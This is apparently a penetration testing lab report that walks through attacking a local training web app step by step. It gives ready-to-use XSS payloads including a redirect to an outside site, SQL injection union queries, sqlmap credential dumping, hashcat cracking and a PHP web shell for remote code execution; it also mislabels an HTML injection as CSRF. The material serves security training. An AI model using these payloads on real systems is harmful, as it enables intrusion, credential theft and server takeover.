# Penetration Testing Lab Report

This report consolidates the tools, commands, and steps used during a penetration test of a lab website. The following steps cover various techniques used to identify and exploit common vulnerabilities.

## Reconnaissance, Enumeration, and Exploitation

1. **Reconnaissance**:
   - Begin by understanding the application and testing default or easy credentials.
   - Explore the application's structure and manually look for potential entry points.

2. **Directory Enumeration with DirBuster**:
   - Use `DirBuster` to enumerate directories:
     ```bash
     dirbuster -u 'http://localhost/capstone/index.php' -w /usr/share/wordlists/dirb/common.txt
     ```
   - After discovering directories, explore them to find vulnerabilities:
     - Example: Access `localhost/capstone/admin/admin.php` and encounter `index.php?message=Admins only!`.
     - Explore other juicy directories for potential hidden areas.

3. **Cross-Site Request Forgery (CSRF)**:
   - Test for CSRF by injecting HTML or scripts via URL parameters:
     ```plaintext
     http://localhost/capstone/index.php?message=message=<h1>XSS</h1>
     ```

4. **Cross-Site Scripting (XSS)**:
   - Inject a script into the message section:
     ```html
     <script>alert(1)</script>
     ```
     Example URL:
     ```plaintext
     http://localhost/capstone/index.php?message=message=<script>alert(1)</script>
     ```
   - Redirect the user to another link:
     ```html
     localhost/capstone/index.php?message=<script>window.location.href = "https://lalbudha.com.np";</script>
     ```

5. **SQL Injection**:
   - Test SQL injection by manipulating parameters in the URL:
     ```plaintext
     http://localhost/capstone/coffee.php?coffee=1' or 1=1 -- 
     ```
   - Use `union select` to find information:
     ```plaintext
     http://localhost/capstone/coffee.php?coffee=1' union select null, Table_name , null, null, null, null, null from information_schema.tables-- -
     ```
   - List columns from tables:
     ```plaintext
     http://localhost/capstone/coffee.php?coffee=1' union select null, null, null, Column_name, null, null, null from information_schema.columns-- -
     ```

6. **Brute Forcing IDs with FFuF**:
   - Generate a list of numbers for ID fuzzing:
     ```bash
     python3 -c 'for i in range(1,101): print(i)' > num.txt
     ```
   - Use `FFuF` to fuzz the IDs:
     ```bash
     ffuf -u 'http://localhost/directory/coffee.php?coffee=FUZZ' -w num.txt
     ```

7. **Cracking Hashes with SQLMAP and Hashcat**:
   - Identify the hashing algorithm using `Hashcat`:
     ```bash
     hashcat -m 3200 my-hash /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt --show
     ```
   - Use `SQLMAP` to dump user credentials:
     ```bash
     sqlmap -r test-coffee.txt -T users --dump
     ```

8. **Gaining Remote Code Execution (RCE)**:
   - After obtaining admin credentials, upload a malicious script:
     ```php
     <?php system($_GET['cmd']); ?>
     ```
   - Execute commands via the browser:
     ```plaintext
     /localhost/directory/script.php?cmd=whoami
     ```

   This should show `www-data`, confirming remote code execution access.

---

This report provides a comprehensive guide for both beginners and advanced users, covering essential tools and techniques for web application penetration testing.
